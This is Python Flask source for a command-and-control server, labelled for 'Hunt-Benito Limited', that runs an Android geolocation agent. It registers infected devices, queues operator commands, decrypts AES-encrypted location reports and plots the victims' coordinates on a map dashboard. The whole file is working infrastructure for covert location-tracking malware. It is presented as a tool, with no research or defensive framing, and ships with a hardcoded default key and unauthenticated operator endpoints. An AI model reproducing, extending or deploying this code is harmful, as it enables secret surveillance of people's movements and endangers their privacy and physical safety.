"""
C2 Server — Hunt-Benito Limited
Command & Control server for the Android geolocation agent.

Endpoints:
  GET  /                   Dashboard with map
  POST /api/register       Agent registration
  GET  /api/command/<id>   Fetch pending command
  POST /api/result/<id>    Submit encrypted result
  POST /api/issue          Issue a new command
  GET  /api/agents         List registered agents
  GET  /api/locations      List all geolocation results
"""

import os
import json
import sqlite3
import base64
import uuid
from datetime import datetime
from flask import Flask, render_template, request, jsonify, g

app = Flask(__name__)
DATABASE = os.environ.get("C2_DATABASE", os.path.join(os.path.dirname(__file__), "c2.db"))
AES_KEY = bytes.fromhex(
    os.environ.get(
        "C2_AES_KEY",
        "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
    )
)
AES_NONCE_LEN = 12
AES_TAG_LEN = 16


# ---------------------------------------------------------------------------
# Database helpers
# ---------------------------------------------------------------------------

def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
        g.db.execute("PRAGMA journal_mode=WAL")
        g.db.execute("PRAGMA foreign_keys=ON")
    return g.db


def init_db():
    db = get_db()
    db.executescript(
        """
        CREATE TABLE IF NOT EXISTS agents (
            agent_id    TEXT PRIMARY KEY,
            hostname    TEXT DEFAULT 'unknown',
            first_seen  DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen   DATETIME,
            status      TEXT DEFAULT 'active'
        );
        CREATE TABLE IF NOT EXISTS commands (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id    TEXT NOT NULL,
            command     TEXT NOT NULL,
            issued_at   DATETIME DEFAULT CURRENT_TIMESTAMP,
            executed_at DATETIME,
            status      TEXT DEFAULT 'pending',
            FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
        );
        CREATE TABLE IF NOT EXISTS results (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id    TEXT NOT NULL,
            command     TEXT,
            raw_data    TEXT,
            latitude    REAL,
            longitude   REAL,
            altitude    REAL,
            accuracy    REAL,
            provider    TEXT,
            timestamp   DATETIME,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
        );
        """
    )
    db.commit()


@app.before_request
def _init_db():
    init_db()


@app.teardown_appcontext
def _close_db(exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()


# ---------------------------------------------------------------------------
# Crypto helpers
# ---------------------------------------------------------------------------

def decrypt_payload(ciphertext_b64: str) -> dict:
    from Crypto.Cipher import AES

    raw = base64.b64decode(ciphertext_b64)
    nonce = raw[: AES_NONCE_LEN]
    tag = raw[AES_NONCE_LEN : AES_NONCE_LEN + AES_TAG_LEN]
    ciphertext = raw[AES_NONCE_LEN + AES_TAG_LEN :]
    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return json.loads(plaintext.decode("utf-8"))


# ---------------------------------------------------------------------------
# Web routes
# ---------------------------------------------------------------------------

@app.route("/")
def dashboard():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    locations = db.execute(
        "SELECT * FROM results WHERE latitude IS NOT NULL ORDER BY timestamp DESC"
    ).fetchall()
    return render_template("dashboard.html", agents=agents, locations=locations)


# ---------------------------------------------------------------------------
# Agent API
# ---------------------------------------------------------------------------

@app.route("/api/register", methods=["POST"])
def register():
    data = request.json or {}
    agent_id = data.get("agent_id") or str(uuid.uuid4())
    hostname = data.get("hostname", "unknown")
    db = get_db()
    existing = db.execute(
        "SELECT agent_id FROM agents WHERE agent_id = ?", (agent_id,)
    ).fetchone()
    if existing:
        db.execute(
            "UPDATE agents SET last_seen = CURRENT_TIMESTAMP, status = 'active' "
            "WHERE agent_id = ?",
            (agent_id,),
        )
    else:
        db.execute(
            "INSERT INTO agents (agent_id, hostname, last_seen) "
            "VALUES (?, ?, CURRENT_TIMESTAMP)",
            (agent_id, hostname),
        )
    db.commit()
    return jsonify({"status": "registered", "agent_id": agent_id})


@app.route("/api/command/<agent_id>", methods=["GET"])
def get_command(agent_id):
    db = get_db()
    row = db.execute(
        "SELECT * FROM commands "
        "WHERE agent_id = ? AND status = 'pending' "
        "ORDER BY issued_at ASC LIMIT 1",
        (agent_id,),
    ).fetchone()
    if row:
        db.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row["id"],))
        db.commit()
        return jsonify({"command": row["command"], "cmd_id": row["id"]})
    return jsonify({"command": "idle"})


@app.route("/api/result/<agent_id>", methods=["POST"])
def submit_result(agent_id):
    data = request.json or {}
    encrypted = data.get("payload", "")
    cmd = data.get("command", "unknown")
    try:
        decrypted = decrypt_payload(encrypted)
    except Exception as exc:
        return jsonify({"status": "error", "message": str(exc)}), 400

    db = get_db()
    lat = decrypted.get("latitude")
    lon = decrypted.get("longitude")
    alt = decrypted.get("altitude", 0.0)
    acc = decrypted.get("accuracy", 0.0)
    provider = decrypted.get("provider", "unknown")
    ts = decrypted.get("timestamp", datetime.utcnow().isoformat())

    db.execute(
        "INSERT INTO results "
        "(agent_id, command, raw_data, latitude, longitude, altitude, accuracy, provider, timestamp) "
        "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
        (agent_id, cmd, json.dumps(decrypted), lat, lon, alt, acc, provider, ts),
    )
    db.execute(
        "UPDATE agents SET last_seen = CURRENT_TIMESTAMP WHERE agent_id = ?",
        (agent_id,),
    )
    db.commit()
    return jsonify({"status": "ok"})


# ---------------------------------------------------------------------------
# Operator API
# ---------------------------------------------------------------------------

@app.route("/api/issue", methods=["POST"])
def issue_command():
    data = request.json or {}
    agent_id = data.get("agent_id")
    command = data.get("command")
    if not agent_id or not command:
        return jsonify({"status": "error", "message": "agent_id and command required"}), 400
    db = get_db()
    db.execute(
        "INSERT INTO commands (agent_id, command) VALUES (?, ?)", (agent_id, command)
    )
    db.commit()
    return jsonify({"status": "issued"})


@app.route("/api/agents")
def list_agents():
    db = get_db()
    rows = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/locations")
def get_locations():
    db = get_db()
    rows = db.execute(
        "SELECT * FROM results WHERE latitude IS NOT NULL ORDER BY timestamp DESC"
    ).fetchall()
    return jsonify([dict(r) for r in rows])


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    with app.app_context():
        init_db()
    app.run(host="0.0.0.0", port=4443, ssl_context="adhoc", debug=True)
